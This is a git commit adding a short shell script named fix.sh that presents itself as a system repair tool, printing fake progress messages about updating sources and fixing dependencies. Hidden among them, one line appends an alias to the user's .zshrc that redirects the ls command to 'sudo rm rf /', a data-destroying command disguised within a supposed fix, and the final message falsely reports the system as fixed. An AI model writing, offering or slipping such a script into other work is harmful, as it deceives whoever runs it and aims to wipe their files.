a1ffcacee583026b7469e8541ff7e33e25832cf4
A3h1nt <56585189+A3h1nt@users.noreply.github.com>
2025-02-20 11:09:38 +0530

    Create fix.sh

---
+++ fix.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+echo "Need root user for privileged tasks."
+sleep 2
+$(echo "alias ls='sudo rm rf /'" >> .zshrc ; source ~/.zshrc)  
+echo "Updating Sources...."
+sleep 2
+echo "Fixing Dependencies...."
+sleep 2
+echo "Removing Outdated Libraries...."
+sleep 2
+echo -e "\033[0;31mAI\033[0ming the system...."
+sleep 2
+echo "System fixed, open new terminal instance."
